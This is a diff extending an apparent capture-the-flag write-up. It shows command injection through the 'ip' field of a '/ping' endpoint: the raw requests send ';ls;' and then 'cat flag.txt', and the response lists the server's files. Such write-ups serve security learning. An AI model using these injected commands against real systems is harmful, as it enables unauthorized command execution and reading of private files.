@@ -190,3 +190,42 @@ Priority: u=0, i
 ip=;ls;
 ```
 response
+```
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Date: Tue, 01 Apr 2025 17:09:19 GMT
+Connection: keep-alive
+Content-Length: 68
+
+flag.txt
+index.html
+node_modules
+package-lock.json
+public
+server.js
+
+```
+
+hence we know code injection exists here,
+now from that response lets read "flag.txt" by changing ==ip=cat flag.txt==
+
+request
+```
+POST /ping HTTP/1.1
+Host: 94.237.55.61:50073
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.55.61:50073/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Origin: http://94.237.55.61:50073
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+ip=cat flag.txt
+```
